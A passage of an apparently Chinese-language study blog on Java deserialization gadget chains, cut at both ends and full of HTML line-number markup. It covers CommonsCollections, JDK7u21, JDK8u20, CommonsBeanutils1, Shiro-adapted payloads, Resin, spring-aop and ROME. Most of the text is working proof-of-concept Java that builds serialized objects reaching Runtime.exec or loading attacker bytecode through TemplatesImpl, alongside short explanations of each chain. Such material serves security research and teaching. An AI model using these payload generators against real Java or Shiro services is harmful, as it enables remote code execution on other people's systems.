class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">chain:</span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        final String[] execArgs = new String[]&#123;&quot;calc&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    final Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                    new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                    new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                    new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                    new Class[]&#123;String.class&#125;,</span><br><span class="line">                    execArgs),</span><br><span class="line">            new ConstantTransformer(1)&#125;;</span><br><span class="line"></span><br><span class="line">    Map innerMap1 = new HashMap();</span><br><span class="line">    Map innerMap2 = new HashMap();</span><br><span class="line"></span><br><span class="line">    // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span><br><span class="line">    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(&quot;yy&quot;, 1);</span><br><span class="line"></span><br><span class="line">    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(&quot;zZ&quot;, 1);</span><br><span class="line"></span><br><span class="line">    // Use the colliding Maps as keys in Hashtable</span><br><span class="line">    Hashtable hashtable = new Hashtable();</span><br><span class="line">    hashtable.put(lazyMap1, 1);</span><br><span class="line">    hashtable.put(lazyMap2, 2);</span><br><span class="line"></span><br><span class="line">    SerializeUtil.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span><br><span class="line"></span><br><span class="line">    // Needed to ensure hash collision after previous manipulations</span><br><span class="line">    lazyMap2.remove(&quot;yy&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    serialize(hashtable);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
### resin  前HashMap.putVal()后ContinuationContext.composeName()-&gt;&gt;NamingManager.getObjectFactoryFromReference()
QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。用链使用了 javax.naming.spi.ContinuationContext 类，其 composeName 方法调用 getTargetContext 方法，然后调用 NamingManager#getContext 方法传入其成员变量 CannotProceedException 的相关属性。

漏洞触发点在 NamingManager#getObjectInstance 方法，这个方法调用 VersionHelper 加载类并实例化加载时使用了 URLClassLoader 并指定了类名和 codebase这个逻辑就赋予了程序远程加载类的功能，也就是漏洞的最终利用点。。
### ContinuationContext
ContinuationContext是ContinuationDirContext的父类
#### getTargetContext-&gt;NamingManager.getContext



### XString (com.sun.org.apache.xpath.internal.objects)  
#### 前HotSwappableTargetSource.equal  后AspectJAwareAdvisorAutoProxyCreator.toString| rome的ToStringBean.toString| xbean-naming::Binding.tostring-&gt;&gt;NamingManager.getObjectFactoryFromReference
#### 前HashMap.putVal() 后 resin::QName.toString()	
QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。

### spring-aop
####  HotSwappableTargetSource利用链    后this.target（XString）的equals -&gt;
这个类的作用是 在代理bean运行过程中，动态更新java对象
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ToStringBean.toString</span><br><span class="line">XString.equals()</span><br><span class="line">HotSwappableTargetSource.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.readObject()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
#### AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder  后BeanFactoryAspectInstanceFactory----&gt;JNDI:SimpleJndiBeanFactory
###  JDK7u21 动态代理   Hashset到动态代理到getAttribute()到defineclass
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;7&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;7&lt;/maven.compiler.target&gt;</span><br><span class="line">&lt;/properties&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Jdk7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        byte[] evilCode = SerializeUtil.getEvilCode();</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilCode&#125;);</span><br><span class="line">        SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;feng&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; memberValues = new HashMap&lt;String, Object&gt;();</span><br><span class="line">        memberValues.put(&quot;f5a5a608&quot;,&quot;feng&quot;);</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)cons.newInstance(Templates.class, memberValues);//如果是TemplatesImpl.class的话，这么多Method，怎么能控制第一个就调用可以利用的newTransformer或者getOutputProperties呢？经过我调式，第一个调用的是init方法，而且会直接抛出异常，导致后面的方法没法调用。为什么Templates.class就可以？看一下Templates的接口就知道了：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(</span><br><span class="line">                Templates.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashSet hashSet = new LinkedHashSet();</span><br><span class="line">        hashSet.add(templates);  //这里有个顺序差 之前提的都是HashSet，为什么这里突然变成了LinkHashSet？因为想想整个的利用流程就知道，反序列化的时候2次put，必须第一次put的是TemplatesImpl对象，第二次是代理对象，才可以成功反序列化。说白了就是，次序上需要可控：</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line"></span><br><span class="line">        memberValues.put(&quot;f5a5a608&quot;,templates);</span><br><span class="line">        byte[] bytes = SerializeUtil.serialize(hashSet);</span><br><span class="line">        SerializeUtil.unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### 8u20 
jdk7u21 的修复方式，是在 AnnotationInvocationHandler 的 readObject() 方法中尝试将 this.type 转换成 AnnotationType ，如果转换失败，就 throw Exception （而不是 直接 return ）：这样的后果是 ，内存中还有handler
如果把AnnotationInvocationHandler#readObject当成内层try catch嵌套在外层try catch中，反序列化的时候会在内存中留下完整的AnnotationInvocationHandler和对应的handler。而此后在真正需要用到AnnotationInvocationHandler的时候，ObjectInputStream会直接引用这个handler。
所以需要找到一个readObject流程里有try catch且不影响反序列化流程的类。


POC两个需要注意到的点
 javassist 给 AnnotationInvocationHandler 加一个 writeObjecct() 方法
删掉TC_ENDBLOCKDATA标志
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public class Poc &#123;</span><br><span class="line">    public static Class newInvocationHandlerClass() throws Exception&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);</span><br><span class="line">        CtMethod writeObject = CtMethod.make(&quot;    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException &#123;\n&quot; +</span><br><span class="line">            &quot;        os.defaultWriteObject();\n&quot; +</span><br><span class="line">            &quot;    &#125;&quot;,clazz);</span><br><span class="line">        clazz.addMethod(writeObject);</span><br><span class="line">        return clazz.toClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">        Class ihClass = newInvocationHandlerClass();</span><br><span class="line">        InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(ihClass).newInstance(Override.class,new HashMap&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(ih,&quot;type&quot;, Templates.class);</span><br><span class="line">        Templates proxy = Gadgets.createProxy(ih,Templates.class);</span><br><span class="line"></span><br><span class="line">        BeanContextSupport b = new BeanContextSupport();</span><br><span class="line">        Reflections.setFieldValue(b,&quot;serializable&quot;,1);</span><br><span class="line">        HashMap tmpMap = new HashMap&lt;&gt;();</span><br><span class="line">        tmpMap.put(ih,null);</span><br><span class="line">        Reflections.setFieldValue(b,&quot;children&quot;,tmpMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy</span><br><span class="line">        set.add(b);</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        HashMap hm = new HashMap();</span><br><span class="line">        hm.put(&quot;f5a5a608&quot;,templates);</span><br><span class="line">        Reflections.setFieldValue(ih,&quot;memberValues&quot;,hm);</span><br><span class="line"></span><br><span class="line">        byte[] ser = Serializer.serialize(set);</span><br><span class="line"></span><br><span class="line">        byte[] shoudReplace = new byte[]&#123;0x78,0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71&#125;;</span><br><span class="line"></span><br><span class="line">        int i = ByteUtil.getSubarrayIndex(ser,shoudReplace);</span><br><span class="line">        ser = ByteUtil.deleteAt(ser,i); // delete 0x78</span><br><span class="line">        ser = ByteUtil.deleteAt(ser,i); // delete 0x70</span><br><span class="line"></span><br><span class="line">// 不能直接 Deserializer.deserialize(ser) , 除非 redefine 了 AnnotationInvocationHandler 否则会报错</span><br><span class="line">//        Deserializer.deserialize(ser);</span><br><span class="line">        ReadWrite.writeFile(ser,&quot;ser.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### CB! 可以调用任意getproperty 后templateimpl rce
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CB1 &#123;</span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;1vxyz&quot;);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;evil.class路径&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = new BeanComparator();</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(2);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;templates,templates&#125;);// 设置BeanComparator.compare()的参数</span><br><span class="line">        setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(&quot;CB-bin/CB1.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">            Class clazz=object.getClass();</span><br><span class="line">            Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">            declaredField.setAccessible(true);</span><br><span class="line">            declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB-bin/CB1.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
注意前面的CC2文章提到了，queue的size应该&gt;2。 而add()也会执行compare由于在BeanComparator#compare() 中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对1、2进行排序。

BeanComparator comparator = new BeanComparator();
PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
queue.add(1);
queue.add(2);
初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们
再用反射将 property 的值设置成恶意的 outputProperties ，将add进队列里的1、2替换成恶意的
TemplateImpl 对象

setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;);
与CC2/4 略微不同的是，还需要用反射去修改 queue属性的值，因为要控制 BeanComparator.compare()的参数为恶意templates对象

setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;templates,templates&#125;);// 设置BeanComparator.compare()的参数

### cck1
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashSet.readObject()</span><br><span class="line">-&gt; java.util.HashMap.put()</span><br><span class="line">-&gt; java.util.HashMap.hash()</span><br><span class="line">    -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">    -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">        -&gt; org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">        -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">            -&gt; java.lang.reflect.Method.invoke()</span><br><span class="line">      ... templates gadgets ...</span><br><span class="line">      -&gt; java.lang.Runtime.exec()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CommonsCollectionsShiro &#123;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);</span><br><span class="line"></span><br><span class="line">        // ==================</span><br><span class="line">        // 生成序列化字符串</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### shiro  CB1  改造版
serialVersionUID问题

没找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于 commons-collections。commons-beanutils 本来依赖于 commons-collections，但是在 Shiro 中，它的 commons-beanutils 虽然包含了一部分 commons-collections 的类，但却不全。这也导致，正常使用 Shiro 的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。问题

CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了 Comparator 和 Serializable ，且位于 Java 的核心代码中，兼容性强。

通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator :

1
final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);


解决两个问题后
##### 有两个版本 1. ReverseComparator
######  2. CaseInsensitiveComparator
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line">public class CommonsBeanutils1Shiro &#123;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line">        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">        // stub data for replacement later</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><span class="line">        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</span><br><span class="line">        // ==================</span><br><span class="line">        // 生成序列化字符串</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream(); </span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr); </span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
### ROME  

#### ObjectBean 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString()
